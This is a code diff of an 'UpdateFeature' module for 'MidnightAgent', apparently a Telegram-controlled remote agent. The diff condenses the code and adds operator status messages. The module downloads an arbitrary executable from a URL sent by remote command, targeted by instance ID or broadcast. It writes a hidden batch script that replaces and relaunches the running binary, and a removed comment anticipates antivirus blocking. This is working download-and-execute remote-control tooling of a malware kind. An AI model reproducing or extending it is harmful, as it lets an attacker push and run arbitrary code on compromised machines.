@@ -10,76 +10,73 @@ namespace MidnightAgent.Features
 {
     public class UpdateFeature : IFeature
     {
+        public static TelegramService TelegramInstance { get; set; }
+
         public string Command => "update";
         public string Description => "Update agent via URL";
         public string Usage => "/update <url> OR /update <id> <url>";
-
-        // IsWaitingForUpdate is REMOVED (No longer waiting for file upload)
-        // ProcessFileUpdate is REMOVED
 
         public async Task<FeatureResult> ExecuteAsync(string[] args)
         {
             try
             {
-                // Case 1: Broadcase/Selected Target -> /update <url>
-                // Case 2: Specific ID -> /update <id> <url>
-
                 string url = "";
-                
                 if (args.Length == 1)
                 {
-                    // Target must be selected via /job or broadcast
-                    if (!AgentState.IsActiveTarget) 
-                        return FeatureResult.Ok(""); // Silent ignore if not target
-
+                    if (!AgentState.IsActiveTarget) return FeatureResult.Ok(""); 
                     url = args[0];
                 }
                 else if (args.Length >= 2)
                 {
-                    string targetId = args[0];
-                    if (targetId != AgentState.InstanceId)
-                    {
-                        // Ignore if ID doesn't match
-                         return FeatureResult.Ok(""); 
-                    }
+                    if (args[0] != AgentState.InstanceId) return FeatureResult.Ok(""); 
                     url = args[1];
                 }
-                else
-                {
-                    return FeatureResult.Fail("Usage: /update <url> OR /update <id> <url>");
-                }
+                else return FeatureResult.Fail("Usage: /update <url> OR /update <id> <url>");
 
                 return await PerformUpdate(url);
             }
-            catch (Exception ex)
-            {
-                return FeatureResult.Fail($"Update Failed: {ex.Message}");
-            }
+            catch (Exception ex) { return FeatureResult.Fail($"Update Failed: {ex.Message}"); }
         }
 
-        public async Task<FeatureResult> PerformUpdate(string url)
+        public async Task<FeatureResult> PerformUpdate(string url, string remoteVersion = null)
         {
             try
             {
-                if (!Uri.IsWellFormedUriString(url, UriKind.Absolute))
-                {
-                    return FeatureResult.Fail("Invalid URL format.");
-                }
+                if (!Uri.IsWellFormedUriString(url, UriKind.Absolute)) return FeatureResult.Fail("Invalid URL format.");
 
-                Logger.Log($"Downloading update: {url}");
-                
-                // Download to Temp
+                // Notify: Update found
+                string versionInfo = !string.IsNullOrEmpty(remoteVersion) ? $" v{remoteVersion}" : "";
+                TelegramInstance?.SendMessage($"🔍 <b>[{AgentState.InstanceId}]</b>\nNew update found{versionInfo}\n" +
+                    $"Current: v{Config.Version}\n⬇️ Downloading...");
+
                 string tempFile = Path.Combine(Path.GetTempPath(), $"update_{DateTime.Now.Ticks}.exe");
-                using (var client = new WebClient())
-                {
-                    await client.DownloadFileTaskAsync(new Uri(url), tempFile);
-                }
+                using (var client = new WebClient()) { await client.DownloadFileTaskAsync(new Uri(url), tempFile); }
 
-                // Apply Update
+                // Notify: Download complete
+                var fileInfo = new FileInfo(tempFile);
+                TelegramInstance?.SendMessage($"✅ <b>[{AgentState.InstanceId}]</b>\nDownload complete!\n" +
+                    $"📦 Size: {FormatFileSize(fileInfo.Length)}\n🔄 Applying update...");
+
                 return ApplyUpdate(File.ReadAllBytes(tempFile));
             }
             catch (Exception ex)
             {
+                TelegramInstance?.SendMessage($"❌ <b>[{AgentState.InstanceId}]</b>\nUpdate Failed: {ex.Message}");
+                return FeatureResult.Fail($"Update Failed: {ex.Message}");
+            }
+        }
+
+        public async Task<FeatureResult> PerformUpdateFromBytes(byte[] fileData, string remoteVersion)
+        {
+            try
+            {
+                TelegramInstance?.SendMessage($"🔍 <b>[{AgentState.InstanceId}]</b>\nNew update found v{remoteVersion}\n" +
+                    $"Current: v{Config.Version}\n📦 Size: {FormatFileSize(fileData.Length)}\n🔄 Applying update...");
+                return ApplyUpdate(fileData);
+            }
+            catch (Exception ex)
+            {
+                TelegramInstance?.SendMessage($"❌ <b>[{AgentState.InstanceId}]</b>\nUpdate Failed: {ex.Message}");
                 return FeatureResult.Fail($"Update Failed: {ex.Message}");
             }
         }
@@ -99,56 +96,34 @@ namespace MidnightAgent.Features
                 
                 string updaterScript = $@"@echo off
 timeout /t 5 /nobreak > nul
-
-REM 1. Try to backup existing agent (Move is safer than Del)
-if exist ""{currentExe}"" (
-    move /y ""{currentExe}"" ""{currentExe}.bak"" > nul
-)
-
-REM 2. Try to place new agent
+if exist ""{currentExe}"" ( move /y ""{currentExe}"" ""{currentExe}.bak"" > nul )
 copy /y ""{tempPath}"" ""{currentExe}"" > nul
-
-REM 3. Verify success
 if exist ""{currentExe}"" (
-    REM Success! Start new agent
-    start """" ""{currentExe}""
-    REM Cleanup backup later (or leave it as fallback)
+    start """" ""{currentExe}"" agent
     del /f /q ""{currentExe}.bak"" > nul
 ) else (
-    REM FAILED! (AV blocked copy?). RESTORE BACKUP IMMEDIATELY!
     move /y ""{currentExe}.bak"" ""{currentExe}"" > nul
     start """" ""{currentExe}""
 )
-
-REM Cleanup temp
 del /f /q ""{tempPath}"" > nul
-del /f /q ""%~f0"" > nul
-";
+del /f /q ""%~f0"" > nul";
+
                 File.WriteAllText(updaterPath, updaterScript);
-
-                // Run updater
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = "cmd.exe",
-                    Arguments = $"/c \"{updaterPath}\"",
-                    CreateNoWindow = true,
-                    UseShellExecute = false
-                });
-
-                // Suicide to allow file operations
+                Process.Start(new ProcessStartInfo { FileName = "cmd.exe", Arguments = $"/c \"{updaterPath}\"", CreateNoWindow = true, UseShellExecute = false });
                 Environment.Exit(0);
-                return FeatureResult.Ok("🔄 Update initiating... (Agent restarting)");
+                return FeatureResult.Ok("🔄 Update initiating...");
             }
-            catch (Exception ex)
-            {
-                return FeatureResult.Fail($"Apply failed: {ex.Message}");
-            }
+            catch (Exception ex) { return FeatureResult.Fail($"Apply failed: {ex.Message}"); }
+        }
+
+        private string FormatFileSize(long bytes)
+        {
+            string[] Suffix = { "B", "KB", "MB", "GB" };
+            int i; double dblSByte = bytes;
+            for (i = 0; i < Suffix.Length && dblSByte >= 1024; i++, dblSByte /= 1024) ;
+            return string.Format("{0:0.##} {1}", dblSByte, Suffix[i]);
         }
         
-        // Legacy shim for compilation safety (though we removed calls in CommandRouter)
-         public Task<FeatureResult> ProcessFileUpdate(TelegramService telegram, string fileId, string fileName)
-         {
-             return Task.FromResult(FeatureResult.Fail("Feature deprecated. Use URL update."));
-         }
+        public Task<FeatureResult> ProcessFileUpdate(TelegramService telegram, string fileId, string fileName) => Task.FromResult(FeatureResult.Fail("Feature deprecated."));
     }
 }
